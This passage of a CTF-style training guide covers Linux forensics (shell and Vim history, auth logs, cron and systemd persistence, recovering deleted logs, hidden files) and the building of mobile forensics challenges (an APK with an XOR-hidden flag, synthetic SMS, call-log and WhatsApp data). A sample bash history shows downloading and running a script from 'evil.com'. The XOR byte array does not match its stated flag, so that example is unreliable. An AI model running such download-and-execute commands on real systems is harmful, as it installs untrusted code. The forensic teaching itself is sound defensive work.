    - **Registers:** Specific text blocks that were copied (yanked) or deleted. **Crucial:** If a user deletes a line of text in Vim, that text is often saved in a register within `.viminfo`, allowing for recovery of content even if the file was never saved.
        
    - **File Marks:** The cursor position in previously opened files.
        

#### 2. Practical Implementation (The "How-To")

**Perspective: The Investigator**

A. Analyzing .bash_history

The goal is to find executed payloads, deleted files, or connections to external IPs.

Bash

```
# 1. Basic Review
cat /home/user/.bash_history

# 2. Look for Anti-Forensics
# If the file is empty, check .bash_logout or look for "history -c"
grep "history -c" /home/user/.bash_history

# 3. Recovering "Hidden" Commands (Contextual)
# If a user uses 'less' or 'vim' on a file, the specific actions INSIDE 
# those tools are not in bash_history. You typically see:
#   wget http://evil.com/payload.sh
#   chmod +x payload.sh
#   ./payload.sh
#   rm payload.sh
```

B. Analyzing .viminfo (Manual Parsing)

The .viminfo file uses specific headers. You can read it with a text editor, but understanding the markers is key.

Bash

```
# View the file
less /home/user/.viminfo

# Key Sections to hunt for:

# 1. Command Line History (Header: # Command Line History)
# Look for substitutions or file writes
# Example: :w /tmp/hidden_flag.txt

# 2. Search String History (Header: # Search String History)
# Shows what the user was looking for.
# Example: /FLAG{

# 3. Registers (Header: # Registers)
# Format: "0  LINE  0
#         The_Text_Content_Here
# "0" is the register name. "LINE" is the type. The next line is the content.
```

C. Analyzing .viminfo (Python Automation)

Use Python to extract registers, which often hold "deleted" text or flags that were pasted.

Python

```
import sys

def parse_viminfo(filepath):
    with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
        lines = f.readlines()

    print(f"[*] Parsing {filepath} for registers and history...")
    
    capture_next = False
    
    for line in lines:
        line = line.strip()
        
        # Extract Search History
        if line.startswith("?"): 
            print(f"[SEARCH] {line[1:]}")
            
        # Extract Command Line History
        if line.startswith(":"):
            print(f"[CMD]    {line[1:]}")
            
        # Extract Registers (Simplified logic)
        # In .viminfo, a register header often looks like ""1  LINE  0"
        if line.startswith('"') and ("LINE" in line or "CHAR" in line):
            capture_next = True
            continue
            
        if capture_next:
            print(f"[REG]    {line}")
            capture_next = False

# Usage
if len(sys.argv) > 1:
    parse_viminfo(sys.argv[1])
```

#### 3. Example Scenario

Scenario: "The Ghost Writer"

Challenge: You have a disk image. The user hacker claims they wrote the flag down but then deleted the file secret.txt. The .bash_history shows rm secret.txt. No file recovery tools (photorec) are finding the file due to overwrites.

Analysis:

1. Investigate `/home/hacker/.viminfo`.
    
2. Locate the **Registers** section.
    
3. Find an entry under register `"1` or `"-` (small delete register).
    
4. **Discovery:** The content `FLAG{vim_never_forgets}` is found stored in the register because the user opened the file in Vim and deleted the line (using `dd`) before saving and quitting. Vim automatically saved the deleted line into `.viminfo`.
    

#### 4. Key Tools

- **`cat` / `less` / `strings`:** Basic CLI tools are usually sufficient for `.bash_history`.
    
- **`viminfor`:** A specialized tool (often found on GitHub) to parse `.viminfo` files into a human-readable report.
    
- **`Vim`:** Paradoxically, opening `vim` in the forensic environment (pointing it to the suspect `.viminfo`) allows you to use `:reg` and `:history` to view the artifacts natively.

---

### Parsing authentication logs (auth.log, secure)

#### 1. Technical Theory

Linux systems centralize authentication-related events in specific log files located in `/var/log/`. The specific filename depends on the distribution:

- **`/var/log/auth.log`**: Used by Debian, Ubuntu, and their derivatives.
    
- **`/var/log/secure`**: Used by RHEL, CentOS, Fedora, and SUSE.
    

These files record activity from the Pluggable Authentication Modules (PAM) system, `sshd` (SSH Daemon), `sudo`, `su`, and `cron`. They are the primary source of evidence for unauthorized access, brute-force attacks, and privilege escalation.

Log Line Structure:

A standard syslog entry generally follows this format:

Month Day Time Hostname Daemon[PID]: Message

**Key Keywords:**

- `Accepted password` / `Accepted publickey`: Successful login.
    
- `Failed password`: Incorrect password attempt.
    
- `Invalid user`: Attempt to login with a username that does not exist.
    
- `COMMAND=`: Indicates a `sudo` command execution.
    

#### 2. Practical Implementation (The "How-To")

**Perspective: The Investigator (Solution)**

The investigator's goal is to filter out the noise (cron jobs, normal session openings) to find anomalies.

Step 1: Rapid Triage (CLI)

Use standard text processing tools to isolate successful and failed logins.

Bash

```
# Find all successful SSH logins
grep "sshd" auth.log | grep "Accepted"

# Find all failed login attempts
grep "sshd" auth.log | grep "Failed"

# Extract just the IP addresses of failed attempts and count them (Top 10 attackers)
grep "Failed password" auth.log | awk '{print $(NF-3)}' | sort | uniq -c | sort -nr | head -10
# Note: $(NF-3) selects the 4th field from the end, which is usually the IP in standard formats.
```

Step 2: Investigating Privilege Escalation

Check for sudo usage to see what commands were run after a user logged in.

Bash

```
# Look for sudo commands
grep "sudo" auth.log | grep "COMMAND"
```

Step 3: Automated Analysis (Python)

For large log files (hundreds of megabytes), CLI tools can become unwieldy. Use Python to parse and correlate data.

Script: Brute Force & Success Correlator

This script identifies IPs that failed multiple times and eventually succeeded (a strong indicator of a successful brute force).

Python

```
import re

def detect_brute_force_success(log_file):
    # Regex patterns
    # Pattern for failed login: matches IP address
    fail_regex = re.compile(r"Failed password .* from (\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})")
    # Pattern for successful login: matches IP address
    success_regex = re.compile(r"Accepted .* from (\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})")

    failed_ips = set()
    compromised_ips = set()

    try:
        with open(log_file, 'r') as f:
            for line in f:
                # Check for failure
                fail_match = fail_regex.search(line)
                if fail_match:
                    failed_ips.add(fail_match.group(1))
                
                # Check for success
                success_match = success_regex.search(line)
                if success_match:
                    ip = success_match.group(1)
                    # If this IP failed previously, it's suspicious
                    if ip in failed_ips:
                        compromised_ips.add(ip)

        if compromised_ips:
            print("[!] POTENTIAL BREACH DETECTED from the following IPs:")
            for ip in compromised_ips:
                print(f"    - {ip} (History of failures followed by success)")
        else:
            print("[*] No correlation between failures and success found.")

    except FileNotFoundError:
        print("[-] Log file not found.")

# Usage
detect_brute_force_success('auth.log')
```

#### 3. Example Scenario

Scenario Name: "Needle in the Haystack"

Narrative: The server web01 was compromised. We have provided the auth.log. The attacker brute-forced the backup user and then switched to root.

Challenge: Identify the timestamp of the successful entry for the backup user.

Analysis:

1. Investigator runs `grep "Accepted" auth.log | grep "backup"`.
    
2. Output: `Nov 21 08:14:37 web01 sshd[1234]: Accepted password for backup from 192.168.1.105 port 54321 ssh2`.
    
3. Investigator then looks for sudo or su commands from that PID or timeframe to confirm the switch to root.
    
    Flag: Nov 21 08:14:37
    

#### 4. Key Tools

- **`grep`, `awk`, `sed`, `cut`:** The fundamental Linux text processing stack.
    
- **`lnav` (Log File Navigator):** A sophisticated terminal-based tool that highlights syntax, stacks recurring messages, and allows SQL-like querying of log files.
    
- **`ausearch`:** Specific to Auditd logs, but often relevant when cross-referencing `auth.log` with `audit.log`.

---

### Auditing scheduled tasks and daemons

#### 1. Technical Theory

Persistence on Linux is frequently achieved by scheduling scripts to run at specific intervals or during system boot.

- **Cron:** The traditional time-based job scheduler. It executes commands defined in "crontab" files. There are user-specific crontabs and system-wide directories (e.g., `/etc/cron.hourly`).
    
- **Systemd:** The modern initialization system. It manages "Services" (background processes/daemons) and "Timers" (time-based activation of services, an alternative to Cron).
    
- **At:** A utility to schedule commands to run once at a future time.
    

Malware and CTF challenges often hide flags or backdoor beacons inside these definitions, masquerading them as legitimate system updates or cleanup scripts.

#### 2. Practical Implementation (The "How-To")

Perspective: The Investigator

You are looking for anomalies: scripts running from /tmp, weird binary names, or base64 encoded commands.

A. Analyzing Cron (Static Analysis)

Cron jobs are scattered across several locations. You must check them all.

1. User-specific Crontabs:
    
    Stored in /var/spool/cron/crontabs/ or /var/spool/cron/.
    
    Bash
    
    ```
    # List current user's cron
    crontab -l
    
    # If you have root, list another user's cron (e.g., www-data)
    crontab -u www-data -l
    
    # View raw files (requires root)
    ls -la /var/spool/cron/crontabs/
    ```
    
2. System-wide Configurations:
    
    These are favored by attackers for deeper persistence.
    
    Bash
    
    ```
    # The main system crontab
    cat /etc/crontab
    
    # Inspect the directory drop-ins
    ls -la /etc/cron.d/
    ls -la /etc/cron.daily/
    ls -la /etc/cron.hourly/
    ls -la /etc/cron.monthly/
    ls -la /etc/cron.weekly/
    ```
    
    _Tip:_ Look for files in `/etc/cron.d/` that do not match standard naming conventions (e.g., `.hidden_update`).
    

B. Analyzing Systemd (Services & Timers)

Systemd offers a more complex attack surface.

1. List Active Timers:
    
    Find jobs scheduled to trigger events.
    
    Bash
    
    ```
    systemctl list-timers --all
    ```
    
2. List Running Services:
    
    Identify suspicious daemons.
    
    Bash
    
    ```
    systemctl list-units --type=service --state=running
    ```
    
3. Inspect Unit Files:
    
    If you find a suspicious service (e.g., backdoor.service), locate its configuration file to see what it executes.
    
    Bash
    
    ```
    # Find the path of the service file
    systemctl status malicious.service
    
    # Read the 'ExecStart' directive
    cat /etc/systemd/system/malicious.service
    ```
    

C. Dynamic Analysis (Live Monitoring)

If you cannot read the cron files (due to permissions) but can run processes, you can watch for the tasks being executed in real-time.

1. Using pspy (CTF Gold Standard):
    
    pspy is a command-line tool designed to snoop on processes without root permissions. It reads from /proc to see commands as they spawn. This captures cron jobs the moment they run.
    
    Bash
    
    ```
    # Upload pspy to the target machine
    chmod +x pspy64
    ./pspy64
    
    # Watch output for recurring commands like:
    # CMD: UID=0 PID=1234 /bin/sh -c /tmp/update.sh
    ```
    

#### 3. Example Scenario

Scenario: "The Ghost Backup"

A server is behaving sluggishly every 5 minutes. You suspect a cryptominer.

1. **Check:** You run `crontab -l` and see nothing.
    
2. **Deep Check:** You list `/etc/cron.d/` and find a file named `backup-sys`.
    
3. Content: cat /etc/cron.d/backup-sys reveals:
    
    */5 * * * * root /usr/bin/python3 /var/opt/.cache/miner.py
    
4. **Flag:** Analyzing `miner.py` reveals the flag in the variable definitions: `WALLET_ID = "flag{cr0n_d_hiding_spot}"`.
    

#### 4. Key Tools

- **pspy:** An unprivileged Linux process snooping tool. Essential for CTFs where you have shell access but no root privileges to read `/etc/cron*`.
    
- **systemctl:** The primary interface for introspecting the systemd state manager.
    
- **Crontab:** The standard utility for maintaining crontab files.

---

### Recovering deleted log entries

#### 1. Technical Theory

In Linux, when a file is "deleted" using `rm`, the operating system essentially performs an `unlink` operation.

- **Inode & Data:** The link between the filename and the Inode (metadata) is removed, and the Inode is marked as "free/available." However, the actual data blocks on the disk are not immediately zeroed out; they remain until the OS needs that space for new data.
    
- **File Descriptors (The "Open" State):** Crucially for logs, if a process (like `rsyslogd`, `apache2`, or `journald`) still has the log file open (active file descriptor) when `rm` is executed, the file is **not** actually deleted from the disk. The directory entry is gone, but the data remains fully accessible via the process's file descriptor in the virtual `/proc` filesystem.
    
- **Journaling:** Modern filesystems like EXT4 use a journal. Even if the file is closed and deleted, remnants of the file's metadata or content might persist in the filesystem journal, allowing tools like `debugfs` or `ext4magic` to recover it.
    

#### 2. Practical Implementation (The Investigator)

There are two primary scenarios: recovering from a still-running process (easiest/cleanest) and recovering from raw disk data (harder/fragmented).

A. Method 1: Recovery via Open File Descriptors (lsof)

This is the standard CTF solution when an attacker deletes a log file (e.g., /var/log/auth.log) but forgets to restart the logging service.

Bash

```
# 1. List all open files that have been unlinked (deleted)
# +L1 : Lists files with a link count of less than 1 (deleted)
lsof +L1

# ALTERNATIVE: Grep for "deleted"
# Look for lines like: rsyslogd  452 root  3w  REG  8,1  /var/log/auth.log (deleted)
lsof | grep "deleted"

# 2. Identify the Process ID (PID) and File Descriptor (FD)
# Output Example:
# COMMAND   PID USER   FD   TYPE DEVICE SIZE/OFF NODE NAME
# rsyslogd  452 root   3w   REG  202,1    10240 1337 /var/log/auth.log (deleted)
# PID = 452, FD = 3 (the 'w' implies write mode)

# 3. Recover the content directly from the /proc filesystem
# The file contents exist in /proc/[PID]/fd/[FD]
cp /proc/452/fd/3 /tmp/recovered_auth.log

# Verify content
head /tmp/recovered_auth.log
```

B. Method 2: Grepping Raw Partition (Data Carving)

If the service was stopped (file closed), the data is in unallocated space. You must scrape the raw block device for known string patterns (e.g., timestamps or service names).

Bash

```
# 1. Identify the partition (e.g., /dev/sda1)
lsblk

# 2. Use grep in binary mode (-a) to search the raw device
# -a: Process a binary file as if it were text
# -B 5 -A 5: Show 5 lines Before and After the match for context
# "sshd": The string we suspect is in the deleted log
sudo grep -a -B 5 -A 5 "sshd" /dev/sda1 > /tmp/carved_logs.txt

# 3. Refining the search (Regex)
# Look for standard syslog timestamp formats (e.g., Nov 21)
sudo grep -a "^[A-Z][a-z]{2} [0-9 ]{2} [0-9]{2}:" /dev/sda1
```

C. Method 3: Filesystem Walk (extundelete / inode analysis)

For EXT3/EXT4 filesystems, if the partition can be unmounted, use specialized tools to traverse the journal.

Bash

```
# Attempt to restore all files deleted from the /var/log directory
# Note: The partition (/dev/sdX1) must be unmounted first
extundelete /dev/sdX1 --restore-directory /var/log
```

#### 3. Example Scenario

**Scenario: The "Ghost" Login**

- **The Setup:** A user reports unauthorized access, but `/var/log/secure` is empty. The attacker ran `rm /var/log/secure` to hide their tracks but did not kill the `rsyslog` daemon.
    
- **The Artifact:** A running Linux VM or a memory dump + disk image.
    
- **The Solution:**
    
    1. Investigator runs `lsof | grep deleted`.
        
    2. They see `rsyslogd` holding a file handle to `/var/log/secure (deleted)`.
        
    3. They read `/proc/<PID>/fd/<FD>` and find the line: `Accepted password for root from 192.168.1.50`.
        

#### 4. Key Tools

- **`lsof` (List Open Files):** The primary tool for identifying deleted files that are still locked by a running process.
    
- **`grep`:** Essential for raw data carving from disk images (`/dev/sda`) when filesystem metadata is destroyed.
    
- **`extundelete`:** A utility for recovering deleted files from EXT3 and EXT4 partitions by parsing the journal.
    
- **`photorec` (TestDisk):** Powerful file carver, though less effective for fragmented text logs compared to specific string searches.

---

### File system traversal and indexing to uncover hidden files

#### 1. Technical Theory

When files are hidden using dot-notation (prefixing with `.`) or deep directory nesting, the files are not cryptographically secured or deleted; they are merely obscured from standard user views. The investigator's solution relies on bypassing shell conventions and leveraging the filesystem's recursive nature.

- **Dot-Notation Bypass:** Standard commands like `ls` rely on shell configuration to ignore entries starting with `.`. The bypass involves using flags (`-a`) or wildcards (`.*`) that force the shell or command to list all entries.
    
- **Deep Nesting Bypass:** The challenge exploits human limitations in manual directory traversal. Tools like **`find`** or **`grep -r`** are designed to use **system calls** (like `getdents` or `stat`) that read directory entries and follow recursion limits automatically, making the depth irrelevant. The key is knowing how to construct an efficient recursive search query.
    

#### 2. Practical Implementation (The Investigator)

The investigator must use powerful, recursive tools to index and search the filesystem based on either filename or content, independent of depth or visibility conventions.

A. Defeating Dot-Notation (Filename Search)

Use the find utility, which processes files based on inode metadata, bypassing the shell's visibility rules.

Bash

```
# Search for any file starting with a dot in the current directory and subdirectories
find . -name ".*" -type f -print

# Search for any file or directory containing the known flag name/pattern
find /evidence/user_home -name "*flag*"
```

B. Defeating Deep Nesting (Recursive Content Search)

This is the most effective method, as it ignores the filename and path structure entirely and hunts for the known flag content (e.g., flag{...}).

Bash

```
# 1. Search recursively (-r) for the flag pattern in a suspected starting directory
# -r: recursive search
# -H: follow symlinks
# -n: output line number
grep -rnH "flag{" /evidence/user_home/

# 2. Combining find and grep for precision and efficiency
# Find files (-type f), then execute the grep command on each found file.
# The `+` argument to `-exec` makes this highly efficient (single invocation of grep).
find /evidence/user_home -type f -exec grep -H "flag{" {} +
```

C. Visualization and Inspection

Use tree -a to get a complete, deep overview of the directory structure, including hidden files (-a). This is useful for spotting odd names (e.g., directories containing spaces or non-printing characters).

Bash

```
# -a: Show all files (including dotfiles)
# -F: Append indicator (*/@|=) to entries
# -L 5: Limit depth to 5 (useful for not flooding the terminal)
tree -aFL 5 /evidence/deep_nest
```

#### 3. Example Scenario

Scenario: The Hidden Configuration

An investigator is analyzing a suspect's hard drive image mounted at /mnt/evidence. The flag is hidden in a seemingly complex and nested path: /mnt/evidence/user/.local/share/systemd/.config/.a_deep_folder/100/.hidden_flag.txt.

The Solution:

The investigator runs the content-based search from the root of the suspect's home directory:

Bash

```
grep -r "flag{" /mnt/evidence/user/
# Output: /mnt/evidence/user/.local/share/systemd/.config/.a_deep_folder/100/.hidden_flag.txt:flag{found_the_needle}
```

This single command successfully penetrates the dot-notation and the deep nesting simultaneously, locating the flag in seconds.

#### 4. Key Tools

- **`find`:** The indispensable utility for recursively searching the filesystem based on attributes (name, size, type) and executing commands on the results.
    
- **`grep`:** Crucial for content-based searching (`grep -r`), which is often faster and more effective than searching purely by filename.
    
- **`tree`:** A powerful visualization tool for rapidly mapping out the directory structure, including hidden files, which aids in targeting subsequent searches.


# Module 8: Mobile Forensics (Android/iOS)

## The Architect (Creation)

### Creating custom Android applications (APK) with hidden flags.

#### 1. Technical Theory

Android applications are compiled into an APK (Android Package) file, which is essentially a ZIP archive containing the app's code and resources. The code is typically written in Java or Kotlin, compiled into `.class` files, and then translated into `.dex` (Dalvik Executable) bytecode, which runs on the Android Runtime (ART).

**Storage Vectors for Flags:**

1. **Java/Kotlin Bytecode:** Strings stored here are easily recovered because decompilers (like JADX) can reconstruct nearly perfect source code.
    
2. **Native Libraries (JNI/NDK):** Flags stored in C/C++ code are compiled into `.so` (Shared Object) libraries. This is significantly harder to reverse as it requires analyzing ARM/x86 assembly rather than high-level Java.
    
3. **Resources (strings.xml):** Data stored here is mostly plain text and trivial to extract.
    

**The Architect's Challenge:** To create a good CTF challenge, you must avoid plain-text strings. You should employ **obfuscation** (e.g., XOR encryption) or **Native Code** to force the investigator to use dynamic analysis or advanced static analysis.

#### 2. Practical Implementation (The "How-To")

**Perspective: The Architect**

To build this, you need **Android Studio**. We will create an app that checks a user's password against a hidden flag stored in a Native C++ library.

**Step 1: Initialize Project with C++ Support**

1. Open Android Studio -> New Project.
    
2. Select **"Native C++"** template (important for creating `.so` libraries).
    
3. Name it `CTF_Challenge_Mobile`.
    

Step 2: The Native C++ Code (native-lib.cpp)

This file contains the flag logic. It compiles into machine code, making it harder to read than Java.

Location: app/src/main/cpp/native-lib.cpp

C++

```
#include <jni.h>
#include <string>
#include <cstring>

// Simple XOR obfuscation function to hide the flag in binary strings
// Key: 0x5A (Z)
std::string decrypt_flag() {
    // Encrypted bytes for "CTF{n4t1v3_c0d3_1s_h4rd}"
    // (This is just a conceptual example; in a real scenario, you'd calculate these hex values beforehand)
    char encrypted[] = {0x19, 0x0E, 0x1C, 0x21, 0x34, 0x6E, 0x2E, 0x6B, 0x2C, 0x69, 0x0F, 0x39, 0x3E, 0x3E, 0x0F, 0x39, 0x29, 0x6F, 0x32, 0x6B, 0x28, 0x3E, 0x27}; 
    // Note: In reality, you would write a quick script to XOR your flag 0x5A to get the array above.
    
    std::string flag = "";
    for (int i = 0; i < sizeof(encrypted); i++) {
        flag += (char)(encrypted[i] ^ 0x5A);
    }
    return flag; // Returns "CTF{...}"
}

extern "C" JNIEXPORT jstring JNICALL
Java_com_example_ctf_1challenge_1mobile_MainActivity_checkFlag(
        JNIEnv* env,
        jobject /* this */,
        jstring inputJStr) {

    // Convert Java string to C++ string
    const char *inputCStr = env->GetStringUTFChars(inputJStr, nullptr);
    std::string input(inputCStr);
    
    // Get the real flag
    std::string secret = decrypt_flag();

    // Check equality
    bool match = (input == secret);
    
    // Clean up
    env->ReleaseStringUTFChars(inputJStr, inputCStr);

    if (match) {
         return env->NewStringUTF("Correct! The flag is the password.");
    } else {
         return env->NewStringUTF("Access Denied.");
    }
}
```

Step 3: The Java Bridge (MainActivity.java)

This connects the UI to the C++ library.

Java

```
package com.example.ctf_challenge_mobile;

import androidx.appcompat.app.AppCompatActivity;
import android.os.Bundle;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;

public class MainActivity extends AppCompatActivity {

    // Load the 'native-lib' library on application startup.
    static {
        System.loadLibrary("native-lib");
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        EditText input = findViewById(R.id.passwordInput);
        Button btn = findViewById(R.id.submitBtn);
        TextView result = findViewById(R.id.resultText);

        btn.setOnClickListener(v -> {
            // Call the native function
            String response = checkFlag(input.getText().toString());
            result.setText(response);
        });
    }

    // Declaration of the native method implemented in C++
    public native String checkFlag(String input);
}
```

**Step 4: Build the APK**

1. Menu: `Build` -> `Build Bundle(s) / APK(s)` -> `Build APK(s)`.
    
2. Output: `app/build/outputs/apk/debug/app-debug.apk`.
    
3. _Optional:_ Use `apksigner` if you modify the APK after building.
    

#### 3. Example Scenario

Title: The Ancient Vault

Scenario: Agents recovered a locked Android device containing a proprietary app Vault.apk. The app presents a simple text box asking for a "Master Key".

The Artifact: An APK where the flag is split into two parts.

1. **Part 1:** Hardcoded in Base64 in `MainActivity.java` (Easy).
    
2. **Part 2:** Hidden inside a native `.so` library, requiring the investigator to reverse engineer the ARM assembly or use dynamic instrumentation (Frida) to hook the `checkFlag` function.
    

#### 4. Key Tools

- **Android Studio:** The primary IDE for writing and compiling Android apps.
    
- **NDK (Native Development Kit):** Required to compile C/C++ code for Android.
    
- **ProGuard / R8:** Built-in tools in Android Studio to obfuscate Java code (rename classes/variables to `a.b.c`), making the investigator's life harder.
    
- **apktool:** Useful for the architect to decompile their own app to verify how "visible" the flag is before releasing.
    

Reversing Android APK packages; Evil Eye
https://www.youtube.com/watch?v=RvnHMoN5C8A

This video demonstrates the investigator's perspective of reversing an APK, which is critical for an architect to understand so you can verify your obfuscation methods effectively.

---

### Generating SMS/MMS and Call Log databases

#### 1. Technical Theory

Android stores telephony and contact data in **SQLite** databases located in the protected internal storage partition.

- **SMS/MMS:** Stored in `mmssms.db`. This database contains multiple tables, but the most critical for forensics are:
    
    - `sms`: Contains standard text messages (Body, Address, Date, Type).
        
    - `threads`: Links messages to specific conversations (Thread ID).
        
    - `pdu` / `part`: Used for MMS (Multimedia Messaging Service) headers and content.
        
- **Call Logs:** Historically stored in `contacts2.db`, but in modern Android versions, they are often found in a dedicated `calllog.db`. The primary table is `calls`.
    
- **Key Constraints:** Timestamps in these databases are typically stored as **Unix Epoch Milliseconds** (13 digits). The `type` column is an integer enum (e.g., 1=Inbox, 2=Sent).
    

#### 2. Practical Implementation (The Architect)

To create a high-fidelity CTF artifact, you must generate valid SQLite files with the correct schema. We will use Python's `sqlite3` and `faker` libraries to generate realistic bulk data.

**Prerequisites:** `pip install faker`

Script 1: Generating mmssms.db (SMS & Threads)

This script creates the database and populates it with a conversation containing a hidden flag.

Python

```
import sqlite3
import random
import time
from faker import Faker

fake = Faker()

def create_sms_db(filename="mmssms.db"):
    conn = sqlite3.connect(filename)
    c = conn.cursor()

    # 1. Create 'sms' table (Simplified Android Schema)
    c.execute('''CREATE TABLE sms (
        _id INTEGER PRIMARY KEY AUTOINCREMENT,
        thread_id INTEGER,
        address TEXT,
        person INTEGER,
        date INTEGER,
        date_sent INTEGER,
        protocol INTEGER DEFAULT 0,
        read INTEGER DEFAULT 1,
        status INTEGER DEFAULT -1,
        type INTEGER,
        reply_path_present INTEGER DEFAULT 0,
        subject TEXT,
        body TEXT,
        service_center TEXT,
        locked INTEGER DEFAULT 0
    )''')

    # 2. Create 'threads' table (Required for some forensic tools to group msgs)
    c.execute('''CREATE TABLE threads (
        _id INTEGER PRIMARY KEY AUTOINCREMENT,
        date INTEGER,
        message_count INTEGER,
        recipient_ids TEXT,
        snippet TEXT,
        snippet_cs INTEGER DEFAULT 0,
        read INTEGER DEFAULT 1,
        type INTEGER DEFAULT 0,
        error INTEGER DEFAULT 0,
        has_attachment INTEGER DEFAULT 0
    )''')

    # 3. Generate specific "Flag" conversation
    target_number = "+15550199"
    target_thread_id = 1
    
    # Create thread entry
    c.execute("INSERT INTO threads (_id, date, message_count, snippet) VALUES (?, ?, ?, ?)",
              (target_thread_id, int(time.time()*1000), 2, "See you there"))

    # Message A (Incoming)
    c.execute('''INSERT INTO sms (thread_id, address, date, type, body) 
                 VALUES (?, ?, ?, ?, ?)''', 
              (target_thread_id, target_number, int(time.time()*1000) - 60000, 1, 
               "Did you hide the package?"))

    # Message B (Outgoing with Flag)
    c.execute('''INSERT INTO sms (thread_id, address, date, type, body) 
                 VALUES (?, ?, ?, ?, ?)''', 
              (target_thread_id, target_number, int(time.time()*1000), 2, 
               "Yes, it's at FLAG{sqliTe_inj3cti0n_mAst3r}"))

    # 4. Generate Noise (Random conversations)
    for i in range(2, 20): # Create 18 random threads
        thread_number = fake.phone_number()
        msg_count = random.randint(1, 10)
        last_msg = ""
        
        for _ in range(msg_count):
            is_inbox = random.choice([1, 2]) # 1=Inbox, 2=Sent
            body = fake.sentence()
            last_msg = body
            c.execute('''INSERT INTO sms (thread_id, address, date, type, body) 
                         VALUES (?, ?, ?, ?, ?)''', 
                      (i, thread_number, int(time.time()*1000) - random.randint(10000, 9999999), 
                       is_inbox, body))
        
        # Create thread entry for noise
        c.execute("INSERT INTO threads (_id, date, message_count, snippet) VALUES (?, ?, ?, ?)",
                  (i, int(time.time()*1000), msg_count, last_msg))

    conn.commit()
    conn.close()
    print(f"[+] Generated {filename}")

create_sms_db()
```

Script 2: Generating calllog.db

This script creates the call history database.

Python

```
def create_calllog_db(filename="calllog.db"):
    conn = sqlite3.connect(filename)
    c = conn.cursor()

    # Create 'calls' table
    c.execute('''CREATE TABLE calls (
        _id INTEGER PRIMARY KEY AUTOINCREMENT,
        number TEXT,
        date INTEGER,
        duration INTEGER,
        type INTEGER,
        new INTEGER,
        name TEXT,
        number_type INTEGER DEFAULT 0,
        number_label TEXT DEFAULT NULL,
        country_iso TEXT DEFAULT 'US',
        voicemail_uri TEXT,
        is_read INTEGER DEFAULT 1,
        geocoded_location TEXT
    )''')

    # Generate Noise
    for _ in range(50):
        # Type: 1=Incoming, 2=Outgoing, 3=Missed
        call_type = random.choice([1, 2, 3])
        duration = random.randint(0, 1200) if call_type != 3 else 0
        
        c.execute('''INSERT INTO calls (number, date, duration, type, name, geocoded_location) 
                     VALUES (?, ?, ?, ?, ?, ?)''',
                  (fake.phone_number(), 
                   int(time.time()*1000) - random.randint(10000, 99999999),
                   duration,
                   call_type,
                   fake.name(),
                   fake.city()))

    conn.commit()
    conn.close()
    print(f"[+] Generated {filename}")

create_calllog_db()
```

Deployment:

Once the .db files are generated, you can place them into a challenge folder or inject them into a rooted Android Emulator:

Bash

```
# Push to emulator (requires root)
adb push mmssms.db /data/data/com.android.providers.telephony/databases/mmssms.db
adb push calllog.db /data/data/com.android.providers.contacts/databases/calllog.db
```

#### 3. Example Scenario

Scenario Name: "The Burner Phone"

Description: Police recovered a "cleaned" Android phone from a drug cartel member. The phone was factory reset, but forensic carving recovered two SQLite files: mmssms.db and calllog.db.

Artifact: The participant receives the two .db files.

Solution:

1. The participant opens `mmssms.db` in a database viewer.
    
2. They filter the `sms` table for the keyword "package" or "drop".
    
3. They find a message with the text: "The drop is at... wait, is this line secure?".
    
4. Cross-referencing the timestamp of that SMS with `calllog.db`, they find a "Missed Call" from the same number 1 minute later.
    
5. However, the flag is actually hidden in the `draft` messages (Type = 3 in SMS table) which are often filtered out by default in some viewers. One draft message reads: `FLAG{check_y0ur_drafts_t00}`.
    

#### 4. Key Tools

- **DB Browser for SQLite:** The industry standard for visually inspecting and editing SQLite files manually.
    
- **Python (sqlite3 & faker):** The best method for procedurally generating massive, realistic datasets.
    
- **Autopsy (Android Module):** To test if your generated databases are parsed correctly by real forensic software. 

---

### Simulating WhatsApp/Telegram chat exports

#### 1. Technical Theory

Mobile chat applications typically store messages in local SQLite databases (e.g., `msgstore.db` for WhatsApp on Android) or proprietary formats. However, the "Chat Export" feature generates a simplified, human-readable text file (usually `.txt`) often accompanied by media files in a ZIP archive.

- **Structure Sensitivity:** Forensic parsers and regex-based CTF scripts rely heavily on strict timestamp and formatting patterns.
    
    - **Android WhatsApp:** `mm/dd/yy, HH:MM - Sender: Message`
        
    - **iOS WhatsApp:** `[dd/mm/yy, HH:MM:SS] Sender: Message`
        
    - **Telegram:** HTML or JSON exports are common, but text exports follow: `Date Time, Sender Name: Message`.
        
- **The Illusion:** A valid CTF artifact must maintain chronological consistency. If the timestamp jumps backwards, parsers may fail or the "forgery" becomes obvious to the investigator.
    

#### 2. Practical Implementation (The "How-To")

To create a realistic dataset for a CTF (e.g., a log containing thousands of messages with a hidden flag), manual typing is inefficient. We use Python to generate the log programmatically with consistent timestamps.

Python Script: WhatsApp Log Generator (Android Style)

This script generates a convincing WhatsApp Chat with [Name].txt file with realistic time intervals between messages.

Python

```
import random
from datetime import datetime, timedelta

def generate_whatsapp_log(output_file, participants, message_count, start_time):
    """
    Generates a fake WhatsApp text export (Android format).
    Format: MM/DD/YY, HH:MM - Sender: Message
    """
    
    # A list of filler messages to create noise
    filler_text = [
        "lol", "okay", "did you see that?", "wait", "calling you now",
        "image omitted", "audio omitted", "brb", "k", "sure thing"
    ]
    
    current_time = start_time
    
    with open(output_file, 'w', encoding='utf-8') as f:
        # Write the encryption warning header
        f.write(f"{current_time.strftime('%m/%d/%y, %H:%M')} - Messages and calls are end-to-end encrypted. No one outside of this chat, not even WhatsApp, can read or listen to them. Tap to learn more.\n")
        
        for i in range(message_count):
            # Randomly advance time (seconds to minutes)
            time_jump = timedelta(seconds=random.randint(10, 300))
            current_time += time_jump
            
            # Select sender
            sender = random.choice(participants)
            
            # 5% chance to insert a "flag piece" or specific clue, otherwise filler
            if i == 50: # Hardcoded injection point for demonstration
                message = "Hey, the password for the zip is: fl4g_p4rt_1"
            elif i == 150:
                message = "Don't forget the second part: _and_secure_c0mm5}"
            else:
                message = random.choice(filler_text)
            
            # Format: 11/21/25, 14:30 - Alice: Hello
            # Note: Windows/Android usually uses 12-hour format, but logs often use 24h or specific locale settings.
            # We will use a standard generic format.
            timestamp_str = current_time.strftime("%m/%d/%y, %H:%M")
            
            entry = f"{timestamp_str} - {sender}: {message}\n"
            f.write(entry)
            
